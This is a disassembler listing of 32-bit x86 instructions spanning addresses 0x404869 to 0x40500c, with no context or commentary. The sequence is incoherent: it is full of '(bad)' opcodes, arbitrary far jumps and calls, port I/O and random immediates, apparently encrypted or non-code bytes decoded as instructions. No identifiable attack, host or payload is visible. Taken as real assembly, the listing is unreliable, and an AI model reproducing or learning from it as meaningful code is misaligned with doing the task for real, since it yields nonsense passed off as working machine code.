  404869:	scas   eax,DWORD PTR es:[edi]
  40486a:	adc    al,dh
  40486c:	stc    
  40486d:	push   esp
  40486e:	clc    
  40486f:	and    dl,al
  404871:	pop    edi
  404872:	xor    DWORD PTR [ebx+eax*1-0x1c31fe5c],esi
  404879:	div    BYTE PTR [ebx]
  40487b:	loopne 0x40480c
  40487d:	cdq    
  40487e:	fwait
  40487f:	add    al,0x13
  404881:	mov    DWORD PTR cs:[edx+0x408909a8],ebx
  404888:	(bad)  
  40488b:	inc    esp
  40488c:	test   eax,eax
  40488e:	cli    
  40488f:	stos   BYTE PTR es:[edi],al
  404890:	gs call 0xfaf9ff6c
  404896:	mov    dh,0x98
  404898:	lods   al,BYTE PTR ds:[esi]
  404899:	clc    
  40489a:	jmp    0x1019:0xd16d9622
  4048a1:	pop    ds
  4048a2:	sbb    bl,ch
  4048a4:	push   edx
  4048a5:	popa   
  4048a6:	fcos   
  4048a8:	pop    ss
  4048a9:	shl    DWORD PTR [edx+0x27],1
  4048ac:	push   cx
  4048ae:	jno    0x40483a
  4048b0:	pop    es
  4048b1:	mov    ch,0xd
  4048b3:	scas   al,BYTE PTR es:[edi]
  4048b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048b5:	test   eax,0xf237a85c
  4048ba:	pop    esi
  4048bb:	lahf   
  4048bc:	pop    edx
  4048bd:	dec    edx
  4048be:	mov    al,ds:0x46e2d2cd
  4048c3:	fnstsw WORD PTR [edx+eax*2]
  4048c6:	mov    WORD PTR [edi],ds
  4048c8:	mul    BYTE PTR [ebx]
  4048ca:	sbb    DWORD PTR gs:[edx],ecx
  4048cd:	repz in al,0x1b
  4048d0:	test   eax,0x59d4cfc1
  4048d5:	xor    eax,0xbad690c
  4048da:	xlat   BYTE PTR ds:[ebx]
  4048db:	and    edx,esp
  4048dd:	fmul   DWORD PTR [esi-0x3e935d7a]
  4048e3:	dec    ebx
  4048e4:	mul    DWORD PTR [ecx]
  4048e6:	stos   DWORD PTR es:[edi],eax
  4048e7:	(bad)  [ebx]
  4048e9:	mov    ch,ah
  4048eb:	cmp    DWORD PTR [edi],ecx
  4048ed:	call   0xa0ae5628
  4048f2:	dec    esi
  4048f3:	xchg   BYTE PTR [ebp+0x6714218c],dl
  4048f9:	add    al,0xc9
  4048fb:	addr16 dec esp
  4048fd:	jg     0x40490f
  4048ff:	das    
  404900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404901:	stos   BYTE PTR es:[edi],al
  404902:	out    0xe5,eax
  404904:	das    
  404905:	ror    DWORD PTR [ecx],0x78
  404908:	enter  0x193f,0xc9
  40490c:	push   ss
  40490d:	jo     0x4048c6
  40490f:	pop    es
  404910:	test   al,0x6f
  404912:	and    al,0x5
  404914:	pop    ds
  404915:	inc    edi
  404916:	in     eax,dx
  404917:	out    dx,eax
  404918:	xchg   edi,eax
  404919:	stc    
  40491a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40491c:	nop
  40491d:	mov    ebp,0x19b67356
  404922:	and    al,0xa6
  404924:	cmp    BYTE PTR [eax+0x5d2a9ea],0x85
  40492b:	dec    edx
  40492c:	ds sub al,0x42
  40492f:	and    ebp,DWORD PTR ds:0xc893b695
  404935:	adc    al,0x69
  404937:	cmp    al,0xb2
  404939:	ja     0x404986
  40493b:	mov    ebp,0xd935892c
  404940:	or     dh,BYTE PTR [esi]
  404942:	jmp    0xc151:0x6efca686
  404949:	arpl   WORD PTR [ecx],cx
  40494b:	or     BYTE PTR [esi+0x4c81ef],bh
  404951:	inc    edi
  404952:	add    BYTE PTR [edx-0x2c7f36ef],ah
  404958:	mov    es,esi
  40495a:	fsubr  DWORD PTR [eax-0x2be1c1d8]
  404960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404961:	cmc    
  404962:	adc    dh,dl
  404964:	or     esp,DWORD PTR [edx+eiz*8-0x335b06c3]
  40496b:	push   esp
  40496c:	in     eax,dx
  40496d:	xor    ebx,esi
  40496f:	imul   eax,DWORD PTR [ebp-0x5625530d],0xffffffb3
  404976:	rcr    DWORD PTR [esi],cl
  404978:	mov    cl,0x82
  40497a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40497b:	xor    eax,0x976f4c3a
  404980:	mov    ebp,0xe77493c3
  404985:	mov    dl,0xb6
  404987:	mov    al,ds:0x7b6eabd7
  40498c:	mov    cl,0xd6
  40498e:	mov    dh,0x47
  404990:	fistp  QWORD PTR [ecx+0x62d511fd]
  404996:	xchg   BYTE PTR [ebx-0x34],ch
  404999:	repnz xchg ebp,eax
  40499b:	xchg   edi,eax
  40499c:	mov    cl,0x47
  40499e:	pusha  
  40499f:	adc    esi,edx
  4049a1:	rol    dl,cl
  4049a3:	sub    DWORD PTR [eax-0x4198853],edx
  4049a9:	adc    al,0xc8
  4049ab:	int3   
  4049ac:	cdq    
  4049ad:	ret    0x400d
  4049b0:	cmp    DWORD PTR ds:0xce8dc62e,ebp
  4049b6:	out    0x1f,al
  4049b8:	(bad)  
  4049b9:	and    edx,DWORD PTR [edi]
  4049bb:	ins    DWORD PTR es:[edi],dx
  4049bc:	push   es
  4049bd:	pop    ss
  4049be:	dec    edi
  4049bf:	loopne 0x404991
  4049c1:	cmp    eax,DWORD PTR [edx]
  4049c3:	jns    0x4049d4
  4049c5:	mov    dl,0xb5
  4049c7:	test   dh,dh
  4049c9:	aaa    
  4049ca:	test   cl,bl
  4049cc:	outs   dx,BYTE PTR ds:[esi]
  4049cd:	add    BYTE PTR [eax-0x31],bh
  4049d0:	cmp    BYTE PTR [esi+0x65cda4d5],bh
  4049d6:	or     al,0x21
  4049d8:	sti    
  4049d9:	cmovns ebx,ecx
  4049dc:	out    0xc1,eax
  4049de:	shl    BYTE PTR [ebx+0x56],cl
  4049e1:	mov    esi,0x7283665d
  4049e6:	mov    al,ds:0xe26719bf
  4049eb:	push   esi
  4049ec:	in     eax,dx
  4049ed:	(bad)  
  4049ee:	mov    bh,0x4e
  4049f0:	shl    BYTE PTR [ecx-0x75e30940],0xf8
  4049f7:	xchg   BYTE PTR [edi],ah
  4049f9:	mov    edi,0x8012c6fd
  4049fe:	shr    BYTE PTR [ecx-0x7102b115],cl
  404a04:	jb     0x404a03
  404a06:	mov    al,0xcc
  404a08:	sbb    eax,0xeef54f84
  404a0d:	adc    cl,dl
  404a0f:	pop    eax
  404a10:	fnsave [esi-0x3bcc659e]
  404a16:	inc    edi
  404a17:	pop    esp
  404a18:	in     eax,0xea
  404a1a:	out    0x34,eax
  404a1c:	xchg   ecx,eax
  404a1d:	mov    cl,0x90
  404a1f:	push   cs
  404a20:	loope  0x404a6c
  404a22:	fsubr  DWORD PTR [edx-0x12450027]
  404a28:	int3   
  404a29:	sbb    edx,DWORD PTR [ebp-0x575cc8c5]
  404a2f:	mov    ch,0x76
  404a31:	ins    BYTE PTR es:[edi],dx
  404a32:	je     0x404a33
  404a34:	inc    ebp
  404a35:	imul   DWORD PTR [esi+ecx*4]
  404a38:	add    DWORD PTR [edi-0x7ff3c32f],eax
  404a3e:	repz mov ecx,0x244da86f
  404a44:	push   ds
  404a45:	inc    esp
  404a46:	xor    BYTE PTR [eax+0x69dcf43d],ch
  404a4c:	leave  
  404a4d:	test   edi,edi
  404a4f:	dec    edi
  404a50:	std    
  404a51:	xchg   edi,eax
  404a52:	xor    edx,esi
  404a54:	cmp    al,0x24
  404a56:	adc    ah,BYTE PTR [eax+0x77b96e6d]
  404a5c:	mov    edi,0xa76cf3ae
  404a61:	adc    ecx,DWORD PTR [edx]
  404a63:	(bad)  
  404a64:	mov    edi,0xef4a2a1e
  404a69:	div    DWORD PTR [ecx-0x3e]
  404a6c:	sbb    al,0x38
  404a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a6f:	xchg   esi,eax
  404a70:	imul   edx,esi,0x3
  404a73:	cmp    ebp,DWORD PTR [ebx-0x8]
  404a76:	call   0xf13:0xda572af7
  404a7d:	hlt    
  404a7e:	ror    ebx,0xf4
  404a81:	(bad)  
  404a82:	fld    TBYTE PTR [esi-0x80]
  404a85:	push   esi
  404a86:	pop    edi
  404a87:	retf   0x1032
  404a8a:	retf   
  404a8b:	add    eax,0x3cb64622
  404a90:	mov    ds:0xfa57f22b,eax
  404a95:	daa    
  404a96:	in     al,dx
  404a97:	std    
  404a98:	fadd   QWORD PTR [ecx+0x692152b6]
  404a9e:	sbb    BYTE PTR [ebp+0x3f0e5ce9],ch
  404aa4:	or     BYTE PTR [ecx-0x1f2cb369],ch
  404aaa:	sahf   
  404aab:	cwde   
  404aac:	push   ebp
  404aad:	pop    ebp
  404aae:	lahf   
  404aaf:	popa   
  404ab0:	and    BYTE PTR [ecx],dh
  404ab2:	aas    
  404ab3:	shl    esp,cl
  404ab5:	cmp    eax,0xc3a4244d
  404aba:	lock or eax,0x28356c5
  404ac0:	sbb    bh,0x60
  404ac3:	xchg   edi,eax
  404ac4:	or     BYTE PTR [edx+0x2aa42ccc],al
  404aca:	ins    DWORD PTR es:[edi],dx
  404acb:	fs cmp bl,bl
  404ace:	imul   esi,DWORD PTR [edi+eax*8],0xffffff9b
  404ad2:	pop    ebp
  404ad3:	inc    esi
  404ad4:	xchg   DWORD PTR [ecx+edi*8+0x1dd5d4ed],edx
  404adb:	cs add bh,bh
  404ade:	loopne 0x404b29
  404ae0:	dec    esi
  404ae1:	xor    eax,0x9cbbf2e9
  404ae6:	xchg   ebx,eax
  404ae7:	mov    al,ds:0x64d291ac
  404aec:	sub    al,0xe4
  404aee:	sbb    dh,dl
  404af0:	hlt    
  404af1:	add    eax,DWORD PTR [esi-0x1c]
  404af4:	mul    dh
  404af6:	mov    DWORD PTR [edx+0x6a37d63d],edx
  404afc:	outs   dx,DWORD PTR ds:[esi]
  404afd:	adc    al,0x9
  404aff:	and    BYTE PTR ds:0x6d17073d,ch
  404b05:	popa   
  404b06:	mov    ds:0xbd468890,eax
  404b0b:	loope  0x404aad
  404b0d:	outs   dx,DWORD PTR ds:[esi]
  404b0e:	add    eax,DWORD PTR [edi]
  404b10:	adc    edx,DWORD PTR [ebx]
  404b12:	add    al,0x33
  404b14:	jmp    0x3ecc:0x4148bfd1
  404b1b:	sub    DWORD PTR [esi+0x741874af],0x0
  404b22:	pop    esi
  404b23:	aaa    
  404b24:	fisubr DWORD PTR [eax]
  404b26:	mov    ds:0xaee4ace7,eax
  404b2b:	cmp    al,BYTE PTR [ecx-0x3568afab]
  404b31:	out    0x5d,al
  404b33:	push   esp
  404b34:	push   esp
  404b35:	retf   0x82c5
  404b38:	cdq    
  404b39:	in     al,0x55
  404b3b:	sub    edi,ebx
  404b3d:	shl    edi,0xe1
  404b40:	jg     0x404acd
  404b42:	clc    
  404b43:	call   0x8f939feb
  404b48:	popa   
  404b49:	mov    al,ds:0x5d9bd972
  404b4f:	cdq    
  404b50:	cmc    
  404b51:	lds    ecx,FWORD PTR [ebx+0x30b57402]
  404b57:	mov    ecx,0x501d094b
  404b5c:	inc    edi
  404b5d:	and    al,0x56
  404b5f:	shl    BYTE PTR [edi-0x43],1
  404b62:	sbb    al,0xb6
  404b64:	aaa    
  404b65:	or     eax,0x11d49443
  404b6a:	(bad)  
  404b6c:	cdq    
  404b6d:	icebp  
  404b6e:	mov    dh,0xf1
  404b70:	mov    bl,0x41
  404b72:	dec    ecx
  404b73:	push   eax
  404b74:	xlat   BYTE PTR ds:[ebx]
  404b75:	lea    ebp,[ebx]
  404b77:	mov    ah,0x85
  404b79:	jnp    0x404b0c
  404b7b:	int3   
  404b7c:	inc    ecx
  404b7d:	(bad)  
  404b7e:	mov    esi,0xa8728ade
  404b83:	adc    BYTE PTR [edx+0x77],bl
  404b86:	or     ebp,DWORD PTR [eax]
  404b88:	fwait
  404b89:	out    0x3e,eax
  404b8b:	pop    eax
  404b8c:	test   al,0x0
  404b8e:	pop    edx
  404b8f:	pop    esi
  404b90:	sub    BYTE PTR [esi-0x81eac25],cl
  404b96:	imul   edx,DWORD PTR [edx-0x70],0xffffff96
  404b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b9b:	mov    ecx,edx
  404b9d:	sub    bl,BYTE PTR [edx]
  404b9f:	inc    eax
  404ba0:	mov    eax,ds:0xf8da9311
  404ba5:	inc    eax
  404ba6:	lods   eax,DWORD PTR ds:[esi]
  404ba7:	sar    bh,0xa4
  404baa:	add    DWORD PTR [ecx+eiz*4+0x7fe3e2c2],edx
  404bb1:	hlt    
  404bb2:	ds (bad) 
  404bb4:	cdq    
  404bb5:	data16 add al,0x8f
  404bb8:	mov    eax,es
  404bba:	loop   0x404b7b
  404bbc:	(bad)  
  404bbd:	test   eax,0xc884c136
  404bc2:	inc    ebx
  404bc3:	loopne 0x404b82
  404bc5:	fidiv  WORD PTR [edi+0x45e9ce97]
  404bcb:	push   ecx
  404bcc:	dec    ebx
  404bcd:	push   ebx
  404bce:	cs (bad) 
  404bd0:	or     eax,0x977c33b1
  404bd5:	adc    al,0xfe
  404bd7:	fs jae 0x404ba0
  404bda:	push   ds
  404bdb:	dec    ebp
  404bdc:	dec    eax
  404bdd:	add    ebx,edi
  404bdf:	cdq    
  404be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404be1:	fs xor eax,0x6b49fa89
  404be7:	jmp    0x404c40
  404be9:	pop    gs
  404beb:	imul   eax,eax,0x63725743
  404bf1:	scas   eax,DWORD PTR es:[edi]
  404bf2:	retf   0xdb27
  404bf5:	or     eax,0xeb7e658c
  404bfa:	pop    esp
  404bfb:	bound  ebp,QWORD PTR [ebp-0x26]
  404bfe:	mov    BYTE PTR [ecx+eiz*1+0xbcf08a9],ah
  404c05:	xchg   ebx,eax
  404c06:	paddd  mm5,QWORD PTR [ecx+0x2e]
  404c0a:	dec    esp
  404c0b:	ficom  WORD PTR [edi-0x152d9626]
  404c11:	or     BYTE PTR [ecx+0x22],dh
  404c14:	mov    bl,0xe4
  404c16:	pop    ebp
  404c17:	inc    ebx
  404c18:	inc    ebx
  404c19:	test   cl,bl
  404c1b:	xor    eax,0x8406c909
  404c20:	adc    BYTE PTR ds:0xf765b0a5,ah
  404c26:	mov    eax,0x4c111f87
  404c2b:	adc    cl,bh
  404c2d:	add    cl,0x56
  404c30:	cwde   
  404c31:	or     bh,BYTE PTR [ebp-0x4b]
  404c34:	adc    bl,bh
  404c36:	(bad)  
  404c37:	test   DWORD PTR [ecx-0x7d0ac2ca],0x3bd9fe5
  404c41:	pop    ss
  404c42:	push   ebp
  404c43:	ins    BYTE PTR es:[edi],dx
  404c44:	es jo  0x404c23
  404c47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c48:	adc    eax,edi
  404c4a:	fs sub eax,0xf2d78cc0
  404c50:	rcr    BYTE PTR [esi-0x55],cl
  404c53:	mov    ds:0xdee37158,al
  404c58:	push   ecx
  404c59:	inc    ecx
  404c5a:	pop    es
  404c5b:	sub    bl,BYTE PTR ds:0x874020fa
  404c61:	push   0x78
  404c63:	out    0x62,eax
  404c65:	mov    al,0x6a
  404c67:	in     eax,0x64
  404c69:	push   ebp
  404c6a:	pop    edi
  404c6b:	retf   0x7a60
  404c6e:	push   esp
  404c6f:	jbe    0x404cd0
  404c71:	mov    eax,0xf59b022
  404c76:	xlat   BYTE PTR ds:[ebx]
  404c77:	and    bh,al
  404c79:	xchg   esi,eax
  404c7a:	and    eax,0x6bbdc474
  404c7f:	or     eax,0xbcc97b5f
  404c84:	or     al,0xce
  404c86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c87:	es (bad) 
  404c89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c8a:	mov    ebp,0xdacdfb80
  404c8f:	scas   eax,DWORD PTR es:[edi]
  404c90:	lea    ebx,[edx+0x5ceb4241]
  404c96:	test   esi,0xa4db1b29
  404c9c:	mov    bh,0x33
  404c9e:	cmp    DWORD PTR [eax-0xe],eax
  404ca1:	jmp    0x404cdf
  404ca3:	bound  ebx,QWORD PTR [eax]
  404ca5:	sub    al,0x6f
  404ca7:	lods   eax,DWORD PTR ds:[esi]
  404ca8:	inc    esi
  404ca9:	xchg   ebx,eax
  404caa:	adc    eax,0xde32704b
  404caf:	loope  0x404cd0
  404cb1:	out    0xdd,al
  404cb3:	inc    ecx
  404cb4:	jle    0x404cb1
  404cb6:	int    0xeb
  404cb8:	sahf   
  404cb9:	push   esp
  404cba:	pushf  
  404cbb:	gs inc edi
  404cbd:	xlat   BYTE PTR ds:[ebx]
  404cbe:	cld    
  404cbf:	mov    edi,0xed36b145
  404cc4:	sub    DWORD PTR [ecx-0x295e9ef3],esp
  404cca:	loopne 0x404cee
  404ccc:	mov    al,0x1b
  404cce:	and    DWORD PTR [eax+0x7b0459ea],0xe
  404cd5:	shr    al,0x76
  404cd8:	jmp    0x52c1:0x13d98d5e
  404cdf:	imul   BYTE PTR [eax]
  404ce1:	sub    ah,BYTE PTR [edi]
  404ce3:	sbb    DWORD PTR [edi+0x7b],ebx
  404ce6:	int    0x26
  404ce8:	cmp    al,0xc1
  404cea:	aad    0xa4
  404cec:	lock or al,BYTE PTR [ecx+eax*2]
  404cf0:	sub    dl,dl
  404cf2:	jle    0x404d12
  404cf4:	lahf   
  404cf5:	bound  ebp,QWORD PTR [ecx]
  404cf7:	popa   
  404cf8:	je     0x404cb6
  404cfa:	inc    esi
  404cfb:	sbb    al,ah
  404cfd:	mov    ah,bl
  404cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d00:	iret   
  404d01:	dec    ebx
  404d02:	push   0xffffffb0
  404d04:	xchg   ebx,eax
  404d05:	mov    al,0xdd
  404d07:	fxch   st(7)
  404d09:	les    ecx,FWORD PTR [ecx-0x13]
  404d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d0d:	fwait
  404d0e:	mov    al,0x15
  404d10:	imul   esi,DWORD PTR [edx+eiz*2-0x5218fcc3],0xffffffbd
  404d18:	add    dh,BYTE PTR [esi]
  404d1a:	push   esp
  404d1b:	pop    ebx
  404d1c:	add    DWORD PTR [esi+0x53],edx
  404d1f:	rcl    BYTE PTR [edi+0x1b30ecd9],cl
  404d25:	xchg   ecx,eax
  404d26:	sbb    BYTE PTR [edx],dh
  404d28:	xchg   ebp,eax
  404d29:	mov    eax,0x21132689
  404d2e:	cdq    
  404d2f:	call   0xa9c4877
  404d34:	or     edx,ecx
  404d36:	push   ebp
  404d37:	ins    DWORD PTR es:[edi],dx
  404d38:	or     al,0xa
  404d3a:	js     0x404cc6
  404d3c:	jno    0x404d11
  404d3e:	retf   0x3963
  404d41:	or     dl,BYTE PTR [ebx+0x57]
  404d44:	inc    eax
  404d45:	in     al,0x4d
  404d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d48:	sbb    edi,DWORD PTR [edi+edi*1]
  404d4b:	daa    
  404d4c:	fistp  WORD PTR [esi+0x89794e6]
  404d52:	cmp    ebx,DWORD PTR [ebx-0x15]
  404d55:	and    esp,DWORD PTR [eax+0x6f]
  404d58:	hlt    
  404d59:	aam    0xf9
  404d5b:	mov    DWORD PTR [ebx],ebx
  404d5d:	icebp  
  404d5e:	mov    dh,0x0
  404d60:	popa   
  404d61:	bound  esi,QWORD PTR [edi+ecx*1+0x14]
  404d65:	int3   
  404d66:	jb     0x404d0d
  404d68:	mov    WORD PTR [edi+edi*4-0x66bfe0f6],cs
  404d6f:	stos   DWORD PTR es:[edi],eax
  404d70:	fs (bad) 
  404d72:	in     al,dx
  404d73:	mov    eax,ds:0xb6973946
  404d78:	sahf   
  404d79:	mov    DWORD PTR [edi+0x63dde759],eax
  404d7f:	mov    ds:0x9012aafe,al
  404d84:	ret    
  404d85:	add    ebp,edi
  404d87:	in     eax,0xae
  404d89:	es in  eax,0x33
  404d8c:	test   BYTE PTR [esp+ebx*4],bl
  404d8f:	scas   al,BYTE PTR es:[edi]
  404d90:	das    
  404d91:	clc    
  404d92:	aam    0x7b
  404d94:	push   edi
  404d95:	jo     0x404d83
  404d97:	add    BYTE PTR [eax+0x12613215],ch
  404d9d:	loopne 0x404d31
  404d9f:	inc    ebx
  404da0:	jmp    0x404d3d
  404da2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404da3:	sub    DWORD PTR [ebp-0x20],edx
  404da6:	adc    esp,0x7b5733b
  404dac:	in     eax,0x4
  404dae:	xor    eax,0xdbf38cc8
  404db3:	push   edi
  404db4:	dec    ebp
  404db5:	cmp    eax,0x42c9102a
  404dba:	fs adc al,0x3c
  404dbd:	cmp    DWORD PTR [esi+0x6c],eax
  404dc0:	fadd   DWORD PTR [edx+ebx*4-0x72]
  404dc4:	call   0xea5c:0x232bf899
  404dcb:	stos   DWORD PTR es:[edi],eax
  404dcc:	adc    eax,0x4bd91906
  404dd1:	popf   
  404dd2:	mov    ds:0x1c7ec19b,al
  404dd7:	xchg   ecx,eax
  404dd8:	jg     0x404daa
  404dda:	and    al,BYTE PTR ds:0x1e97a7df
  404de0:	hlt    
  404de1:	push   esp
  404de2:	push   ss
  404de3:	cmp    esp,eax
  404de5:	(bad)  
  404de6:	cmp    edx,esi
  404de8:	mov    WORD PTR [edi+edx*2+0x53],ds
  404dec:	fstp   DWORD PTR [edx-0x54]
  404def:	inc    edi
  404df0:	call   0x9d966e49
  404df5:	sub    dh,BYTE PTR [esi]
  404df7:	inc    ebp
  404df8:	pop    edx
  404df9:	sub    al,0x1c
  404dfb:	(bad)  
  404dfc:	sub    dh,al
  404dfe:	and    DWORD PTR [edi-0x2a74509b],esp
  404e04:	push   es
  404e05:	jmp    0x4e0a815e
  404e0a:	or     al,0x48
  404e0c:	dec    esi
  404e0d:	sub    DWORD PTR [ecx-0x729ca02a],ebp
  404e13:	pop    esi
  404e14:	pusha  
  404e15:	pop    ecx
  404e16:	push   0xae6c67f7
  404e1b:	jmp    FWORD PTR [ecx]
  404e1d:	cwde   
  404e1e:	psubsw mm5,QWORD PTR [eax]
  404e21:	xor    DWORD PTR [esi],ebp
  404e23:	jo     0x404e39
  404e25:	inc    edi
  404e26:	ss ja  0x404dab
  404e29:	repnz or ch,BYTE PTR [esi]
  404e2c:	pop    esp
  404e2d:	add    al,0x5b
  404e2f:	or     esi,DWORD PTR [edx-0xd892e05]
  404e35:	in     eax,dx
  404e36:	inc    edx
  404e37:	xor    al,0x50
  404e39:	imul   edx,DWORD PTR [esi+edi*2],0xffffff92
  404e3d:	(bad)  
  404e3e:	ja     0x404e8c
  404e40:	test   ch,0xc
  404e43:	icebp  
  404e44:	adc    DWORD PTR [edi+0x73],edx
  404e47:	adc    DWORD PTR [esi],esi
  404e49:	mov    bh,0xc2
  404e4b:	in     al,0xa8
  404e4d:	push   ds
  404e4e:	dec    ebx
  404e4f:	jl     0x404e39
  404e51:	mov    bl,0x4
  404e53:	or     bl,dl
  404e55:	aam    0x18
  404e57:	lods   al,BYTE PTR ds:[esi]
  404e58:	add    BYTE PTR [edx+0x45],ah
  404e5b:	push   edi
  404e5c:	sub    DWORD PTR [edi-0x58da0e64],edx
  404e62:	pop    ebp
  404e63:	inc    ebp
  404e64:	push   eax
  404e65:	add    BYTE PTR [eax-0x6a],al
  404e68:	xchg   ebp,eax
  404e69:	(bad)  
  404e6a:	icebp  
  404e6b:	out    0xed,eax
  404e6d:	dec    esi
  404e6e:	xchg   ebx,eax
  404e6f:	ja     0x404e0d
  404e71:	jecxz  0x404e57
  404e73:	mov    al,0xa3
  404e75:	pop    ebx
  404e76:	clc    
  404e77:	inc    ebx
  404e78:	sub    esp,esp
  404e7a:	mov    edi,0x64144a04
  404e7f:	ret    
  404e80:	inc    ebx
  404e81:	cmp    ah,BYTE PTR [eax+0x3b7e98dc]
  404e87:	int3   
  404e88:	xor    bl,BYTE PTR [ebp+edx*2+0x64287596]
  404e8f:	dec    BYTE PTR [edx+eax*8]
  404e92:	in     al,dx
  404e93:	retf   0xcad6
  404e96:	shl    DWORD PTR [eax-0x1a],1
  404e99:	cmp    al,0xe4
  404e9b:	push   es
  404e9c:	das    
  404e9d:	pop    edx
  404e9e:	(bad)  
  404e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ea0:	(bad)  
  404ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ea2:	int3   
  404ea3:	xor    edi,DWORD PTR [esi]
  404ea5:	or     bl,0x22
  404ea8:	clc    
  404ea9:	out    dx,al
  404eaa:	cwde   
  404eab:	mov    ecx,0x9ee12ee7
  404eb0:	sub    ah,cl
  404eb2:	jae    0x404edc
  404eb4:	pop    esi
  404eb5:	(bad)  
  404eb6:	xchg   esp,eax
  404eb7:	jge    0x404e69
  404eb9:	sbb    dh,BYTE PTR [edx+0x2074d718]
  404ebf:	pop    ebp
  404ec0:	cmp    esi,eax
  404ec2:	push   edi
  404ec3:	outs   dx,BYTE PTR ds:[esi]
  404ec4:	add    BYTE PTR [ebx+0x24],cl
  404ec7:	jge    0x404ebd
  404ec9:	sbb    bl,BYTE PTR [edx-0x3d]
  404ecc:	adc    ch,ch
  404ece:	xor    al,0x41
  404ed0:	mov    esp,0xf4e1fdfa
  404ed5:	sar    DWORD PTR [ebx-0x3f],0xf3
  404ed9:	test   DWORD PTR [edx-0x297d2ec8],0xe3c3bf1a
  404ee3:	das    
  404ee4:	in     eax,0xd9
  404ee6:	popf   
  404ee7:	adc    al,0x5e
  404ee9:	mov    al,0xd8
  404eeb:	ss pop edx
  404eed:	jle    0x404f35
  404eef:	hlt    
  404ef0:	cld    
  404ef1:	mov    ds:0xd0ca8101,al
  404ef6:	jnp    0x404eb1
  404ef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef9:	sbb    al,0xf4
  404efb:	das    
  404efc:	(bad)  
  404efd:	retf   0x7eca
  404f00:	jecxz  0x404f77
  404f02:	popa   
  404f03:	fnstcw WORD PTR [edi+0xee6e6dd]
  404f09:	jb     0x404eb8
  404f0b:	sbb    dl,dl
  404f0d:	mov    ecx,esi
  404f0f:	addr16 ret 
  404f11:	sahf   
  404f12:	inc    esp
  404f13:	add    DWORD PTR ds:0x3eb2a8ab,ebp
  404f19:	add    DWORD PTR [ebp-0x39b63462],0x86524847
  404f23:	mov    cl,0x3e
  404f25:	adc    cl,BYTE PTR [esi-0x344da00c]
  404f2b:	and    BYTE PTR [eax+0x7889d75],0x50
  404f32:	add    DWORD PTR [ebx-0x34],ecx
  404f35:	loopne 0x404fb5
  404f37:	add    ch,BYTE PTR [esi+0x5aa07ee]
  404f3d:	jne    0x404f7f
  404f3f:	pusha  
  404f40:	jl     0x404f6f
  404f42:	mov    esi,0xdecb1959
  404f47:	imul   edx,DWORD PTR [ebp+0x4337a6ca],0x1696c850
  404f51:	mov    ebp,0x54f0c5d9
  404f56:	xchg   ebx,eax
  404f57:	sti    
  404f58:	push   eax
  404f59:	inc    edi
  404f5a:	add    DWORD PTR [edi+0x1aad29b],ebx
  404f60:	imul   esp,edx,0x2dd80168
  404f66:	inc    ebx
  404f67:	js     0x404f0d
  404f69:	repnz neg ecx
  404f6c:	xor    DWORD PTR [ebx+0x65],0xffffffe0
  404f70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f71:	jb     0x404f7a
  404f73:	push   eax
  404f74:	hlt    
  404f75:	push   edx
  404f76:	jge    0x404f54
  404f78:	mov    ebx,DWORD PTR [ebp+0x4173b200]
  404f7e:	addr16 push ebp
  404f80:	adc    ch,bl
  404f82:	sub    DWORD PTR [edi-0x6e67e036],ebx
  404f88:	jo     0x404fc7
  404f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f8b:	or     al,0x49
  404f8d:	push   ebx
  404f8f:	mov    eax,0x11eee06d
  404f94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f95:	sub    eax,0x549aab9c
  404f9a:	cmp    BYTE PTR [ecx],bh
  404f9c:	rcr    BYTE PTR [eax+0xa],cl
  404f9f:	pop    eax
  404fa0:	mov    esp,DWORD PTR [eax+0x1e]
  404fa3:	push   esp
  404fa4:	imul   ecx,esp,0x3c75226a
  404faa:	jbe    0x404f7a
  404fac:	mov    eax,ds:0x8697a6
  404fb1:	mov    ah,0x1c
  404fb3:	xchg   esi,eax
  404fb4:	sub    DWORD PTR [edx],ebp
  404fb6:	loop   0x404fdf
  404fb8:	sbb    al,0xd6
  404fba:	call   0x86d9a72a
  404fbf:	adc    DWORD PTR [esi+0x17978432],esp
  404fc5:	mov    BYTE PTR [ebx-0x1d6113ee],ah
  404fcb:	jno    0x404fa8
  404fcd:	nop
  404fce:	fisub  WORD PTR [ebx+0x76]
  404fd1:	pop    esp
  404fd2:	ret    0xbb78
  404fd5:	mov    bl,0xbd
  404fd7:	push   edi
  404fd8:	jbe    0x404f5a
  404fda:	mov    eax,ds:0xa0bd5027
  404fdf:	stos   DWORD PTR es:[edi],eax
  404fe0:	add    BYTE PTR [esi+0x28],ah
  404fe3:	les    ebx,FWORD PTR [eax+0x17]
  404fe6:	mov    dh,0xb9
  404fe8:	xchg   esi,eax
  404fe9:	adc    ah,0xcd
  404fec:	mov    edi,0xb74dfdff
  404ff1:	xchg   DWORD PTR [edi],esi
  404ff3:	les    ebx,FWORD PTR [ebx]
  404ff5:	ja     0x405021
  404ff7:	pop    esi
  404ff8:	jp     0x404fae
  404ffa:	int3   
  404ffb:	push   ebp
  404ffc:	mov    ebx,0x8f0a82b3
  405001:	push   0xffffffc6
  405003:	lahf   
  405004:	xor    DWORD PTR [ebx],ebx
  405006:	rol    BYTE PTR [ebx-0xd],1
  405009:	or     esi,ebp
  40500b:	std    
  40500c:	pop    edx
